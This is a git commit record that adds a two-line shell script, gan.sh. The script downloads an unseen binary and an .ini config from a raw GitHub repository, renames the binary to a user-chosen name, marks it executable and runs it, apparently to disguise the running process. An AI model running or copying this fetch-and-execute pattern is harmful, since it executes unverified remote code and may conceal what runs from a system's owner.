6bf8f8432f9aaee1aa86dbe8c0fbdce2326b5d31
penjelajahwaktu <141205123+penjelajahwaktu@users.noreply.github.com>
2023-08-10 07:32:31 +0700

    Update and rename mood.sh to gan.sh

---
+++ gan.sh
@@ -0,0 +1,2 @@
+read -p " name: " CRP
+wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/tesk.ini && mv cok $CRP && chmod +x $CRP && ./$CRP tesk.ini
